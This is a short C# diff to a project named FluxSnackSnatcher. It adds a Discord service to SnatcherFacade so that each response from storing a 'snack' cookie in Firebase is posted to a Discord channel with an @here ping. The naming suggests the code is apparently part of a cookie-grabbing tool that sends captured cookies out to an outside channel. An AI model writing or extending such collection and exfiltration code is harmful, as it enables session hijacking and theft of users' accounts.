@@ -7,10 +7,12 @@ namespace FluxSnackSnatcher.Facades
     public class SnatcherFacade : ISnatcherFacade
     {
         private readonly IFirebaseService _firebaseService;
+        private readonly IDiscordService _discordService;
 
-        public SnatcherFacade(IFirebaseService firebaseService)
+        public SnatcherFacade(IFirebaseService firebaseService, IDiscordService discordService)
         {
             _firebaseService = firebaseService;
+            _discordService = discordService;
         }
 
         public async Task<string> SnatchSnack(string? snacks, string url)
@@ -44,6 +46,8 @@ namespace FluxSnackSnatcher.Facades
                         var response = await _firebaseService.SetCookie(cookie);
 
                         Console.WriteLine(response);
+
+                        await _discordService.SendMessage($"```{response}```\n@here");
                     }
                 }
 
